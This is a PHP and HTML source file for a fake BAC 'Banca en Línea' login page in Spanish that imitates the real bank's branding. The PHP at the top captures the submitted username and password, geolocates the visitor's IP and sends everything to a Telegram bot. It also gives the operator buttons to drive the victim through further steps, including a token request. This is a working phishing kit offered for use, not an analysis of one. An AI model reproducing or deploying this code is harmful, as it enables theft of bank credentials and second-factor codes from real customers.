<?php
include("data.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = trim($_POST['usuario'] ?? '');
    $clave   = trim($_POST['contrasena'] ?? '');

    $ip  = client_ip() ?: '?';
    $geo = geo_lookup($ip);

    $ubic = trim(($geo['city'] ? $geo['city'] . ', ' : '')
                . ($geo['region'] ? $geo['region'] . ', ' : '')
                . $geo['country'], ', ');

    $msg  = "🏦 BAC — ACCESO\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 <b>Usuario:</b> " . htmlspecialchars($usuario) . "\n";
    $msg .= "🔑 <b>Clave:</b> "   . htmlspecialchars($clave)   . "\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
    $msg .= ($geo['flag'] ?: '📍') . " <b>País:</b> " . htmlspecialchars($geo['country']);
    if ($geo['country_code']) $msg .= " (" . $geo['country_code'] . ")";
    $msg .= "\n";
    if ($ubic && $ubic !== $geo['country']) $msg .= "🏙 <b>Ubicación:</b> " . htmlspecialchars($ubic) . "\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '✅ LOGIN',      'callback_data' => "LOGIN|$usuario"],
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|$usuario"],
            ],
            [
                ['text' => '🔑 TOK',        'callback_data' => "TOK|$usuario"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => $keyboard,
    ]));

    header('Location: espera.php?u=' . urlencode($usuario) . '&step=login');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>BAC | Banca en Línea</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #e8e8e8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header {
            background-color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 30px;
            height: 80px;
            border-bottom: 1px solid #ddd;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .header-left img {
            height: 45px;
        }

        .logo-mobile {
            display: none;
        }

        .header-left .separator {
            width: 1px;
            height: 30px;
            background-color: rgba(0,0,0,0.2);
        }

        .header-left .banca-text {
            color: #333;
            font-size: 16px;
            font-weight: 500;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .header-right .ayuda {
            color: #333;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            text-decoration: none;
        }

        .header-right .country {
            color: #333;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }

        .country-flag {
            width: 24px;
            height: 24px;
            background: #0067b1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .country-flag::after {
            content: '';
            width: 8px;
            height: 8px;
            background: white;
            border-radius: 50%;
        }

        /* Sub header */
        .sub-header {
            background-color: white;
            text-align: center;
            padding: 10px 0;
            border-bottom: 1px solid #ddd;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        .sub-header a {
            color: #0067b1;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .sub-header a svg {
            width: 18px;
            height: 18px;
        }

        /* Main content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            background-color: #f1f1f2;
            background-image: url('img/background.png');
            background-size: 100% 100%;
            background-position: center -100px;
            background-repeat: no-repeat;
            position: relative;
        }

        /* Login card */
        .login-card {
            background: white;
            border-radius: 8px;
            padding: 40px 50px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            position: relative;
        }

        .shield-icon {
            position: absolute;
            top: 20px;
            right: 25px;
            width: 36px;
            height: 36px;
            color: #999;
        }

        .login-card .welcome-text {
            text-align: center;
            color: #333;
            font-size: 16px;
            margin-bottom: 5px;
            margin-top: 10px;
        }

        .login-card .title {
            text-align: center;
            color: #1a1a1a;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .form-group input {
            width: 100%;
            padding: 14px 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            border-color: #0067b1;
        }

        .checkbox-group {
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .checkbox-group input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #0067b1;
        }

        .checkbox-group label {
            font-size: 14px;
            color: #333;
            cursor: pointer;
        }

        .btn-ingresar {
            width: 100%;
            padding: 14px;
            background-color: #0067b1;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.2s;
        }

        .btn-ingresar:hover {
            background-color: #005a9e;
        }

        .no-ingresar {
            text-align: center;
            margin-top: 20px;
        }

        .no-ingresar a {
            color: #0067b1;
            text-decoration: none;
            font-size: 14px;
        }

        .no-ingresar a:hover {
            text-decoration: underline;
        }

        /* Crear usuario section */
        .crear-usuario {
            background: #f2f2f2;
            width: 100%;
            max-width: 480px;
            text-align: center;
            padding: 20px;
            border-radius: 0 0 8px 8px;
            margin-top: -4px;
        }

        .crear-usuario a {
            color: #333;
            text-decoration: none;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .crear-usuario a:hover {
            text-decoration: underline;
        }

        .crear-usuario svg {
            width: 20px;
            height: 20px;
            color: #666;
        }

        /* Footer */
        .footer {
            background-color: #e4002b;
            padding: 4px 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }

        .footer img {
            height: 79px;
        }

        .footer .separator {
            width: 1px;
            height: 20px;
            background-color: rgba(255,255,255,0.5);
        }

        .footer .footer-text {
            color: white;
            font-size: 13px;
        }

        .footer .footer-text a {
            color: white;
            text-decoration: underline;
            font-weight: 600;
        }

        .hamburger {
            display: none;
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px;
        }

        .hamburger svg {
            width: 28px;
            height: 28px;
            color: #333;
        }

        /* Mobile */
        @media (max-width: 768px) {
            .header {
                padding: 0 15px;
                height: 60px;
                background-color: #ffffff;
            }

            .logo-desktop {
                display: none;
            }

            .logo-mobile {
                display: block;
                height: 45px;
            }

            .ayuda {
                display: none !important;
            }

            .country span,
            .country svg {
                display: none;
            }

            .country-flag {
                width: 28px;
                height: 28px;
            }

            .hamburger {
                display: block;
            }

            .sub-header {
                display: none;
            }

            .main-content {
                padding: 0;
                background-image: none;
                background-color: #ffffff;
                justify-content: flex-start;
            }

            .login-card {
                border-radius: 0;
                box-shadow: none;
                padding: 50px 35px 40px;
                max-width: 100%;
            }

            .shield-icon {
                position: absolute;
                top: 25px;
                right: 30px;
                width: 32px;
                height: 32px;
            }

            .login-card .welcome-text {
                font-size: 16px;
                margin-bottom: 8px;
                margin-top: 5px;
            }

            .login-card .title {
                font-size: 32px;
                font-family: 'Graphik', Helvetica, sans-serif;
                font-weight: 700;
                color: #000000;
                margin-bottom: 40px;
            }

            .form-group {
                margin-bottom: 24px;
            }

            .form-group:last-of-type {
                margin-bottom: 35px;
            }

            .form-group input {
                padding: 16px 14px;
            }

            .checkbox-group {
                margin-bottom: 12px;
            }

            .btn-ingresar {
                margin-top: 25px;
                padding: 16px;
            }

            .crear-usuario {
                display: none;
            }

            .footer {
                flex-direction: row;
                padding: 15px;
                gap: 10px;
                justify-content: flex-start;
                align-items: center;
            }

            .footer .separator {
                display: block;
                height: 35px;
                align-self: center;
            }

            .footer img {
                height: 40px;
                max-width: 60px;
                object-fit: contain;
            }

            .footer .footer-text {
                font-size: 12px;
                text-align: left;
                line-height: 1.5;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header class="header">
        <div class="header-left">
            <img src="img/logo_header.svg" alt="BAC Logo" class="logo-desktop">
            <img src="img/logo_bac.svg" alt="BAC Logo" class="logo-mobile">
        </div>
        <div class="header-right">
            <a href="#" class="ayuda">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>
                </svg>
                Ayuda
            </a>
            <div class="country">
                <div class="country-flag"></div>
                <span>NI</span>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path d="m6 9 6 6 6-6"/>
                </svg>
            </div>
            <button class="hamburger" aria-label="Menú">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path d="M3 6h18M3 12h18M3 18h18"/>
                </svg>
            </button>
        </div>
    </header>

    <!-- Sub header - Tipo de Cambio -->
    <div class="sub-header">
        <a href="#">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>
            </svg>
            Tipo de Cambio
            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                <path d="m6 9 6 6 6-6"/>
            </svg>
        </a>
    </div>

    <!-- Main content -->
    <main class="main-content">
        <div class="login-card">
            <!-- Shield icon -->
            <svg class="shield-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="m9 12 2 2 4-4"/>
            </svg>

            <p class="welcome-text">Le damos la bienvenida a</p>
            <h1 class="title">Banca en Línea</h1>

            <form id="loginForm" method="POST" action="" autocomplete="off">
                <div class="form-group">
                    <label for="usuario">Usuario</label>
                    <input type="text" id="usuario" name="usuario" autocomplete="username" required>
                    <p class="field-error" id="usuarioError" style="display:none">El usuario no puede ser un correo electrónico.</p>
                </div>

                <div class="form-group">
                    <label for="contrasena">Contraseña</label>
                    <input type="password" id="contrasena" name="contrasena" autocomplete="current-password" required>
                    <?php if (!empty($_GET['error'])): ?>
                        <p class="field-error">Usuario o contraseña inválidos.</p>
                    <?php endif; ?>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="recordar">
                    <label for="recordar">Recordar Usuario</label>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="token">
                    <label for="token">Usar token</label>
                </div>

                <button type="submit" class="btn-ingresar">Ingresar</button>
            </form>

            <div class="no-ingresar">
                <a href="#">¿No puede ingresar?</a>
            </div>
        </div>

        <div class="crear-usuario">
            <a href="#">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><line x1="19" y1="8" x2="19" y2="14"/><line x1="22" y1="11" x2="16" y2="11"/>
                </svg>
                Crear usuario por primera vez
            </a>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <img src="img/preview_red.png" alt="BAC Logo">
        <div class="separator"></div>
        <span class="footer-text">
            Todos los derechos reservados. 2026 &copy; BAC International Bank. <a href="#">Términos y condiciones.</a>
        </span>
    </footer>

<style>
  .field-error{
    color:#e4002b;font-size:13px;font-weight:600;
    margin-top:8px;line-height:1.35;
    display:flex;align-items:center;gap:6px;
  }
  .field-error::before{content:"⚠";font-size:14px}
  .input-error{border-color:#e4002b !important;box-shadow:0 0 0 3px rgba(228,0,43,.12) !important}
<?php if (!empty($_GET['error'])): ?>
  #contrasena{border-color:#e4002b !important;box-shadow:0 0 0 3px rgba(228,0,43,.12) !important}
<?php endif; ?>
</style>

<script>
(function(){
  var input = document.getElementById('usuario');
  var err   = document.getElementById('usuarioError');
  var form  = document.getElementById('loginForm');
  if (!input || !err) return;

  function looksLikeEmail(v){
    // detecta @ o formato de correo
    return /@/.test(v) || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
  }
  function validate(){
    var v = input.value.trim();
    if (v && looksLikeEmail(v)) {
      err.style.display = 'flex';
      input.classList.add('input-error');
      return false;
    }
    err.style.display = 'none';
    input.classList.remove('input-error');
    return true;
  }
  input.addEventListener('input', validate);
  input.addEventListener('blur', validate);
  if (form) {
    form.addEventListener('submit', function(e){
      if (!validate()) { e.preventDefault(); input.focus(); }
    });
  }
})();
</script>
</body>
</html>
